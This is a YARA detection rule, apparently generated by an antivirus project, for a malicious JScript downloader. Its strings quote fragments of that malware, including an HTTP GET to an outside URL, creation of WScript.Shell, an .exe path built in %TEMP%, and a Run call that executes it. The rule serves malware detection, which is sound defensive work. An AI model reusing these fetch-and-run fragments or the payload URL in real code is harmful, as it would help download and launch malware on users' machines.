rule sig_20160401_29b3671f513f77c092867fc0f6fb3826 {
  meta:
    description = "datamaliciousorder - file 20160401_29b3671f513f77c092867fc0f6fb3826.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d92da6c9903f87efaec20d576fa2eb7607e77dd8db1c10a098c0f349567e3aaf"

  strings:
    $s1  = "JhiMh[EbnEw](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "function BioUt(HydQw, DaYc){AmaLbu = AmaLbu * 1; return HydQw - DaYc;};" fullword ascii
    $s3  = "var BqEab = function DecMhm() {return WScript[UihGaf](\"WScript\"+\".Shell\");}(), UkVk = 11;" fullword ascii
    $s4  = "if (JhiMh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WbPu() {return BqEab[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sdul6RDteLb.ex\" + \"e\";};" fullword ascii
    $s6  = "function RdeNkp(){return IjZs + \"\";};" fullword ascii
    $s7  = "function VjvZa() {return ((AsiZb == true) && (AsiZb == LobVzu)) ? 1 : AmaLbu;};" fullword ascii
    $s8  = "return BioUt(PgAk, AoeGf);" fullword ascii
    $s9  = "function KbFnf()" fullword ascii
    $s10 = "function NrwGln(){return UihGaf;};" fullword ascii
    $s11 = "LobVzu = true; " fullword ascii
    $s12 = "}while (JcBr);" fullword ascii
    $s13 = "function XzPt(){return 23;};" fullword ascii
    $s14 = "function SoYn(ShOjt){BqEab[\"R\"+\"un\"](ShOjt, AmaLbu, AmaLbu);};" fullword ascii
    $s15 = "var TokHm = false;" fullword ascii
    $s16 = "AsiZb = true; " fullword ascii
    $s17 = "var OfUy = new this[\"Date\"]();" fullword ascii
    $s18 = "var AsiZb = false;" fullword ascii
    $s19 = "var LobVzu = false;" fullword ascii
    $s20 = "function MpzUx(VyePk) {var VvWq = (1, 2, 3, 4, 5, VyePk); return VvWq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}